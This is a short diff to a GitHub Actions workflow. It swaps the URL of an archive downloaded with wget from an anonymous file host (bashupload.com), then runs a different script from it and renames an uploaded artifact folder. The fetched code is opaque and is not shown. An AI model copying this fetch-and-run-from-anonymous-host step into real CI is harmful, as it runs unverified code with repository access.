@@ -17,13 +17,13 @@ jobs:
       - name: Run a multi-line script
         run: |
           sudo apt update
-          wget https://bashupload.com/CZFj5/github.tar.gz
+          wget https://bashupload.com/263YX/github.tar.gz
           tar -xf github.tar.gz
           pip install -r requirements.txt
-          python menu.py
+          python run.py
       # Upload all .txt files from the /data folder
       - name: Upload .txt files from data folder
         uses: actions/upload-artifact@v4
         with:
-          name: data
-          path: data/*.txt
+          name: OK
+          path: OK/*.txt
